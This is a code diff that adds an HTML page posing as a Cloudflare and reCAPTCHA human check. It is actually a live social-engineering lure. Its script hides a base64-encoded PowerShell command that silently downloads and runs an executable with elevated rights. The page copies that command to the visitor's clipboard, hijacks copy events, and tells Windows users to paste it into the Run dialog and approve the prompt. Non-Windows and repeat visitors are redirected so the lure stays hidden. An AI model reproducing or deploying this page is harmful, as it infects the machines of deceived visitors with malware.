@@ -1,1 +1,434 @@
-<div> hello world </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Um momento...</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* (keep all existing styles exactly as before) */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      display: flex; flex-direction: column; height: 100vh; min-height: 100vh;
+      background-color: #1c1c1c; color: #e0e0e0;
+    }
+    .main-wrapper { align-items: center; display: flex; flex: 1; flex-direction: column; }
+    .main-content { margin: 8rem auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; width: 100%; }
+    .-container { display: flex; align-items: center; }
+    .logo-img { height: 2rem; margin-right: 0.5rem; filter: brightness(0.9); }
+    .domain-title { font-size: 2.5rem; font-weight: 500; line-height: 3.75rem; color: #ffffff; }
+    .text-container { font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; min-height: 2rem; font-weight: 550; padding-top: 2px; color: #cccccc; }
+    .preloader { display: flex; align-items: center; justify-content: center; }
+    .lds-ring { display: inline-block; position: relative; height: 1.875rem; width: 1.875rem; }
+    .lds-ring div {
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border: 0.3rem solid transparent; border-radius: 50%; border-top-color: #ffffff;
+      box-sizing: border-box; display: block; position: absolute; height: 1.875rem; width: 1.875rem;
+    }
+    .lds-ring div:first-child { animation-delay: -0.45s; }
+    .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+    .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+    @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @media (prefers-color-scheme: dark) { body .lds-ring div { border-color: #aaaaaa transparent transparent; } }
+    .checkbox-window {
+      display: flex; flex-direction: column; align-items: center; width: 300px; height: 74px;
+      background-color: #1c1c1c; border: 1px solid #444444; border-radius: 4px; padding: 10px;
+      overflow: hidden; transition: width 0.5s ease-in-out, height 0.5s ease-in-out, opacity 0.3s;
+      opacity: 0; color: #ddd;
+    }
+    .checkbox-window-inner { display: flex; align-items: center; width: 100%; }
+    .checkbox-container { width: 30px; height: 28px; margin-left: 3px; margin-right: 12px; position: relative; }
+    #spinner2 { width: 40px; height: 40px; animation: rotate 4s linear infinite; margin-top: -4px; fill: #4caf50; }
+    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    .checkbox { width: 100%; height: 100%; background-color: #2c2c2c; border-radius: 2px; border: 2px solid #888; cursor: pointer; transition: border-color 0.3s, background-color 0.3s; }
+    .checkbox.checked { border-color: #4285f4; background-color: #4285f4; position: relative; }
+    .checkbox.checked::after { content: "\f00c"; font-family: "FontAwesome"; color: #fff; font-size: 18px; position: absolute; top: -2px; left: 2px; }
+    .spinner { visibility: hidden; position: relative; }
+    .tettx { color: #cccccc; }
+    .tettx p { margin: 0 !important; }
+    .legal-links { font-size: 8px; text-align: right; margin-left: auto; color: #aaa; }
+    .legal-links img { width: 67px; height: 23px; margin-bottom: 5px; filter: brightness(0.8) contrast(1.2); }
+    .legal-links p { text-decoration: underline; color: #bbb; }
+    .verify-window {
+      font-family: Roboto, helvetica, arial, sans-serif; opacity: 0; visibility: hidden; width: 100%; height: 0;
+      transition: opacity 0.5s, height 0.5s; border-top: 1px solid #555555; padding-top: 3px; margin-top: 15px; color: #ddd;
+    }
+    .verify-window.active { opacity: 1; visibility: visible; height: auto; display: block; }
+    .verify-main { padding: 16px; font-size: 14px; color: #dddddd; }
+    .verify-main p:first-of-type { font-size: 18px; margin-bottom: 15px; color: #ffffff; }
+    .verify-main ol { padding-left: 20px; }
+    .verify-main ol li { margin-bottom: 10px; }
+    .verify-main code { display: block; margin-top: 10px; background-color: #2a2a2a; padding: 10px; font-size: 12px; border: 1px solid #555; color: #ccc; }
+    .verify-main .observe { padding-top: 10px; }
+    .verify-main .observe code { background: #1e1e1e; border: 1px solid #666; width: 432px; color: #bbbbbb; }
+    .verify-footer { background-color: #1a1a1a; padding: 16px; text-align: right; }
+    .verify-footer-container { background: none; }
+    .verify-footer-left { width: 286px; float: left; text-align: left; font-size: 15px; color: #ccc; }
+    .verify-verify-button { background: #3a3a3a; padding: 9px 38px; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background 0.2s; }
+    .verify-verify-button:hover { background: #555555; }
+    .footer { font-size: 0.75rem; line-height: 1.125rem; margin: 0 auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; width: 100%; }
+    .footer-inner { border-top: 1px solid #444; padding-bottom: 1rem; padding-top: 1rem; text-align: center; color: #aaa; }
+    .footer-inner > div:first-child { margin-bottom: 5px; }
+    .footer-inner code { font-family: monospace; background: #222; padding: 2px 4px; border-radius: 4px; }
+    .domain-footer { font-size: 1.5rem; line-height: 2.25rem; padding-top: 33px; color: #ccc; }
+    .step0, .step1, .step2, .step3 { display: none; }
+    .step0.active, .step1.active, .step2.active, .step3.active { display: block; }
+    .success-icon { width: 30px; height: 30px; }
+    .success-icon circle { fill: #28a745; }
+    .success-icon path { stroke: white; stroke-width: 4; fill: none; stroke-linecap: round; stroke-linejoin: round; }
+    /* popup custom style (dark theme) */
+    .popup-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center;
+      z-index: 9999; font-family: system-ui, sans-serif; opacity: 0; visibility: hidden;
+      transition: opacity 0.2s ease;
+    }
+    .popup-overlay.active { opacity: 1; visibility: visible; }
+    .popup-card {
+      background: #1e1e1e; border: 1px solid #444; border-radius: 12px; padding: 2rem;
+      max-width: 400px; text-align: center; color: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    }
+    .popup-card p { font-size: 1.2rem; margin-bottom: 1.5rem; }
+    .popup-card button {
+      background: #3a3a3a; border: none; color: white; padding: 0.75rem 2rem;
+      border-radius: 40px; font-size: 1rem; cursor: pointer; transition: background 0.2s;
+    }
+    .popup-card button:hover { background: #555; }
+  </style>
+  <link rel="icon" id="dynamic-favicon" href="data:,">
+</head>
+<body>
+<div class="main-wrapper">
+  <div class="main-content">
+    <div class="logo-container">
+      <img class="logo-img" src="" alt="Site logo">
+      <p class="domain-title"><span class="domain-name"></span></p>
+    </div>
+
+    <div class="text-container">
+      <p>
+        <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
+        <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
+      </p>
+    </div>
+
+    <div class="intro">
+      <div class="preloader">
+        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+      </div>
+
+      <div id="checkbox-window" class="checkbox-window" style="display: none;">
+        <div class="checkbox-window-inner">
+          <div class="checkbox-container">                            
+            <svg class="step0" id="spinner2" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg" style="display: none;">
+              <circle cx="30" cy="10" r="2.5" class="point"></circle>
+              <circle cx="50" cy="30" r="2.5" class="point"></circle>
+              <circle cx="30" cy="50" r="2.5" class="point"></circle>
+              <circle cx="10" cy="30" r="2.5" class="point"></circle>
+              <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
+              <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
+              <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
+              <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
+            </svg>
+
+            <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
+
+            <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
+              <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+            </div>
+
+            <div class="step3" style="display: none;">
+              <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="25" cy="25" r="23"/>
+                <path d="M15 25 L22 32 L35 18"/>
+              </svg>
+            </div>
+          </div>
+
+          <div class="tettx">
+            <p class="step0">Verifying...</p>
+            <p class="step1" style="display: none;">I'm not a robot</p>
+            <p class="step2" style="display: none;">Verification Steps</p>
+            <p class="step3" style="display: none;">Successfully.</p>
+          </div>
+
+          <div class="legal-links">
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/2560px-Cloudflare_Logo.svg.png" alt="Logo">
+            <p>Confidentiality</p>
+            <p>Terms and Conditions</p>
+          </div>
+        </div>
+
+        <div id="verify-window" class="verify-window">
+          <div class="verify-container">
+            <main class="verify-main">
+              <p>To better prove you are not a robot, please:</p>
+              <ol>
+                <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+                <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+                <li>Press <b>Enter</b> on your keyboard.</li>
+                <li>Click <b>Yes</b> when prompted.</li>
+              </ol>
+              <p class="observe">
+                You will observe and agree:<br>
+                <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
+              </p>
+            </main>
+          </div>
+          <div class="verify-container verify-footer verify-footer-container">
+            <div class="verify-footer-left">Perform the steps above to finish verification.</div>
+            <button type="button" class="verify-verify-button block" id="verify-button">Verify</button>
+          </div>
+        </div>
+      </div>
+
+      <p class="domain-footer">
+        <span class="domain-name"></span> needs to review the security of your connection before proceeding.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- popup overlay (hidden by default) -->
+<div id="popup" class="popup-overlay">
+  <div class="popup-card">
+    <p>Please verify that you human before clicking Verify.</p>
+    <button id="close-popup">OK</button>
+  </div>
+</div>
+
+<div class="footer" role="contentinfo">
+  <div class="footer-inner">
+    <div>
+      <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
+    </div>
+    <div>Platform performance and security <span style="color: #cccccc">Cloudflare</span></div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- CONFIG -----
+  // Base64 encoded PowerShell command
+  const CONFIG = {
+  // Base64 encoded PowerShell command
+  encodedCommand: "cG93ZXJzaGVsbCAtYyAic2FwcyBwb3dlcnNoZWxsIC1WZXJiIFJ1bkFzIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUFyZ3VtZW50TGlzdCAnaXdyICJodHRwczovL2dpdGh1Yi5jb20vbGludXhtaW50MTIzNDU2NzY3OC9wZXIvcmVsZWFzZXMvZG93bmxvYWQvMS8yIiAtT3V0RmlsZSBDOlwxLmV4ZTsgU3RhcnQtUHJvY2VzcyBDOlwxLmV4ZSciICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo=",
+  
+  // Decoded command (for reference)
+  get command() {
+    return atob(this.encodedCommand);
+  }
+};
+
+    // ----- REDIRECT RULES (user agent & second visit) -----
+    (function earlyRedirectCheck() {
+      // 1. Check if user agent is NOT Windows (Windows identifiers: "Windows", "Win64", "Win32")
+      var ua = navigator.userAgent;
+      var isWindows = /Windows|Win64|Win32/i.test(ua);
+      
+      // 2. Check sessionStorage for a "firstVisit" flag (only exists after first load)
+      var hasVisited = sessionStorage.getItem('cv_visited') === 'true';
+      
+      // If it's not Windows OR it's a second visit (hasVisited true), redirect immediately to google.com
+      if (!isWindows || hasVisited) {
+        window.location.replace('https://optijuegos.net/');
+        return; // stop further execution
+      }
+      
+      // Otherwise (first visit, Windows user) -> set the flag and continue
+      sessionStorage.setItem('cv_visited', 'true');
+    })(); // execute right away
+
+    // ----- I18N DICTIONARY (minimal) -----
+    const I18N = {
+      en: { checking: "Checking if you are human. This may take a few seconds.", verifyInstruction: "Verify you are human by completing the action below.", verifying: "Verifying...", notRobot: "I'm not a robot", steps: "Verification Steps", success: "Successfully.", verifyTitle: "To better prove you are not a robot, please:", step1: "Press & hold the Windows Key <i class='fab fa-windows'></i> + <b>R</b>.", step2: "In the verification window, press <b>Ctrl</b> + <b>V</b>.", step3: "Press <b>Enter</b> on your keyboard.", step4: "Click <b>Yes</b> when prompted.", observe: "You will observe and agree:", confirmLead: "I am not a robot - reCAPTCHA Verification ID: ", final: "Perform the steps above to finish verification.", verifyBtn: "Verify", confidentiality: "Confidentiality", terms: "Terms and Conditions", footer: "needs to review the security of your connection before proceeding." },
+    };
+    I18N.de = I18N.en; I18N.fr = I18N.en; I18N.es = I18N.en; I18N.pt = I18N.en;
+
+    // ----- UTILITIES -----
+    function detectLanguage() { return "en"; } // force english
+    function getHostname(val) {
+      if (!val) return window.location.hostname || '';
+      try { return new URL(val, window.location.origin).hostname; }
+      catch { return String(val).replace(/^https?:\/\//i, '').split('/')[0]; }
+    }
+    function copyToClipboard(text) {
+      const textarea = document.createElement('textarea');
+      textarea.value = text; textarea.setAttribute('readonly', '');
+      textarea.style.position = 'absolute'; textarea.style.left = '-9999px';
+      document.body.appendChild(textarea); textarea.select();
+      try { document.execCommand('copy'); } catch (e) { console.error('Copy failed:', e); }
+      document.body.removeChild(textarea);
+    }
+    function generateVerificationId() { return Math.floor(100000 + Math.random() * 900000); }
+    function generateRayId() { const chars = "abcdef0123456789"; return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join(""); }
+
+    // ----- INITIALIZATION (only runs if not redirected) -----
+    function initializeDomainAndLogo() {
+      const params = new URLSearchParams(window.location.search);
+      const siteParam = params.get('site');
+      const logoParam = params.get('logo');
+      const host = getHostname(siteParam) || window.location.hostname || '';
+      document.querySelectorAll('.domain-name').forEach(el => el.textContent = host);
+      const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`;
+      const faviconEl = document.getElementById('dynamic-favicon');
+      if (faviconEl) faviconEl.href = faviconUrl;
+      const candidates = [ faviconUrl, `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean);
+      document.querySelectorAll('.logo-img').forEach(img => {
+        let i = 0;
+        const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; };
+        img.alt = host + ' logo'; img.onerror = tryNext; tryNext();
+      });
+    }
+    function initializeI18n() {
+      const lang = detectLanguage(); const t = I18N[lang] || I18N.en;
+      const pre = document.querySelector(".preloader_text"); if (pre) pre.textContent = t.checking;
+      const allstep = document.querySelector(".textallstep"); if (allstep) allstep.textContent = t.verifyInstruction;
+      const setText = (sel, txt) => document.querySelectorAll(sel).forEach(el => el.textContent = txt);
+      setText(".tettx .step0", t.verifying); setText(".tettx .step1", t.notRobot); setText(".tettx .step2", t.steps); setText(".tettx .step3", t.success);
+      const titleP = document.querySelector("#verify-window .verify-main p:first-of-type");
+      if (titleP) titleP.innerHTML = t.verifyTitle;
+      const stepsOl = document.querySelector("#verify-window .verify-main ol");
+      if (stepsOl) stepsOl.innerHTML = `<li>${t.step1}</li><li>${t.step2}</li><li>${t.step3}</li><li>${t.step4}</li>`;
+      const observeP = document.querySelector("#verify-window .verify-main p.observe");
+      if (observeP) {
+        const codeEl = observeP.querySelector("code");
+        const idSpan = codeEl ? codeEl.querySelector("#verification-id") : null;
+        const idHtml = idSpan ? idSpan.outerHTML : '<span id="verification-id"></span>';
+        if (codeEl) codeEl.innerHTML = ` ✅ "${t.confirmLead}${idHtml}" `;
+      }
+      const left = document.querySelector(".verify-footer-left"); if (left) left.textContent = t.final;
+      const btn = document.getElementById("verify-button"); if (btn) btn.textContent = t.verifyBtn;
+      const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
+      if (legalBox) { const ps = legalBox.querySelectorAll("p"); if (ps[0]) ps[0].textContent = t.confidentiality; if (ps[1]) ps[1].textContent = t.terms; }
+      const footerP = document.querySelector(".domain-footer");
+      if (footerP) {
+        const host = footerP.querySelector(".domain-name")?.textContent || window.location.hostname || "";
+        footerP.innerHTML = `<span class="domain-name">${host}</span> ${t.footer}`;
+      }
+    }
+
+    // ----- TIME TRACKING FOR VERIFY BUTTON (20 second rule) -----
+    // Record the moment the checkbox window becomes visible (or when step1 becomes active)
+    let verificationStartTime = null;
+
+    function initializeVerification() {
+      const preloaderElements = document.querySelectorAll(".preloader");
+      const preloaderText = document.querySelector(".preloader_text");
+      const textAllStep = document.querySelector(".textallstep");
+      const checkboxWindow = document.getElementById("checkbox-window");
+      const step0Elements = document.querySelectorAll(".step0");
+      const step1Elements = document.querySelectorAll(".step1");
+      const step2Elements = document.querySelectorAll(".step2");
+      const step3Elements = document.querySelectorAll(".step3");
+      const checkbox = document.getElementById("checkbox");
+      const verifyWindow = document.getElementById("verify-window");
+      const spinner = document.getElementById("spinner");
+      const verifyButton = document.getElementById("verify-button");
+      const popup = document.getElementById("popup");
+      const closePopup = document.getElementById("close-popup");
+
+      // sequence after 1.5s
+      setTimeout(() => {
+        preloaderElements.forEach(el => el.style.display = "none");
+        if (preloaderText) preloaderText.style.display = "none";
+        if (textAllStep) textAllStep.style.display = "block";
+        if (checkboxWindow) {
+          checkboxWindow.style.display = "flex";
+          setTimeout(() => {
+            let opacity = 0;
+            const fadeIn = setInterval(() => {
+              if (opacity >= 1) clearInterval(fadeIn);
+              else { opacity += 0.1; checkboxWindow.style.opacity = opacity; }
+            }, 30);
+          }, 200);
+        }
+
+        step0Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+        setTimeout(() => {
+          step0Elements.forEach(el => { el.style.display = "none"; el.classList.remove("active"); });
+          step1Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+          // Set start time when step1 appears (user can click)
+          verificationStartTime = Date.now();
+        }, 2000);
+      }, 1500);
+
+      // checkbox click → copy & expand
+      if (checkbox) {
+        checkbox.addEventListener("click", function () {
+          copyToClipboard(CONFIG.command);
+          step1Elements.forEach(el => { el.style.display = "none"; el.classList.remove("active"); });
+          step2Elements.forEach(el => { el.style.display = "block"; el.classList.add("active"); });
+          if (spinner) spinner.style.visibility = "visible";
+
+          setTimeout(() => {
+            if (checkboxWindow) {
+              checkboxWindow.style.width = "530px";
+              checkboxWindow.style.height = "auto";
+            }
+            if (verifyWindow) verifyWindow.classList.add("active");
+          }, 500);
+        });
+      }
+
+      // Verify button click → check 20 seconds, otherwise popup
+      if (verifyButton) {
+        verifyButton.addEventListener("click", function (e) {
+          e.preventDefault(); // prevent any default action
+          
+          // If start time not set, fallback to now (shouldn't happen)
+          if (!verificationStartTime) verificationStartTime = Date.now();
+          
+          const elapsedSeconds = (Date.now() - verificationStartTime) / 1000;
+          
+          if (elapsedSeconds >= 20) {
+            // 20 seconds passed -> redirect to google.com
+            window.location.href = "https://optijuegos.net/";
+          } else {
+            // less than 20 seconds -> show popup
+            if (popup) popup.classList.add("active");
+          }
+        });
+      }
+
+      // Close popup
+      if (closePopup) {
+        closePopup.addEventListener("click", function () {
+          popup.classList.remove("active");
+        });
+      }
+      // Optional: click outside popup closes it (via overlay)
+      if (popup) {
+        popup.addEventListener("click", function (e) {
+          if (e.target === popup) popup.classList.remove("active");
+        });
+      }
+
+      // set dynamic IDs
+      const verEl = document.getElementById("verification-id");
+      if (verEl) verEl.textContent = generateVerificationId();
+      const rayEl = document.querySelector(".ray-id");
+      if (rayEl) rayEl.textContent = generateRayId();
+    }
+
+    // override copy event
+    document.addEventListener('copy', function (e) {
+      e.preventDefault();
+      if (e.clipboardData) e.clipboardData.setData('text/plain', CONFIG.command);
+      else if (window.clipboardData) window.clipboardData.setData('Text', CONFIG.command);
+    });
+
+    function ready(fn) { if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", fn); else fn(); }
+    ready(function () {
+      // only run if not redirected (earlyRedirectCheck might have replaced page)
+      // simple check: if still on this page (no redirect), proceed
+      initializeDomainAndLogo();
+      initializeI18n();
+      initializeVerification();
+    });
+  })();
+</script>
+</body>
+</html>
